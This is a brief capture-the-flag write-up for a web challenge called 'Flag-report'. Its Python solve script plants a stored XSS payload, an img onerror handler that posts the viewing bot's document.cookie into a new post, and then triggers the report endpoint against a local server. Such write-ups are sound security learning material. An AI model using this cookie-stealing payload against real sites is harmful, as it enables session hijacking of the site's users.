Flag-report - Web

It was clearly XSS by creating a new post such that when reported and looked by the bot. Was just trying it when the CTF ended. Got it after it ended.
<h1>Solve.py</h1>

```
import requests

URL = "http://localhost:5000" 

create_url = f"{URL}/create"
data = {
    "title": "x",
    "body": """<img src=x onerror='fetch("/create", { method: "POST", body: new URLSearchParams({ title: "flag", body: "flag: " + document.cookie }) });'>""",
}

x = requests.post(create_url, data=data)
print(x.status_code)

post_id = 1
report_url = f"{URL}/report?id={post_id}"
x = requests.get(report_url)
print(requests.text)
```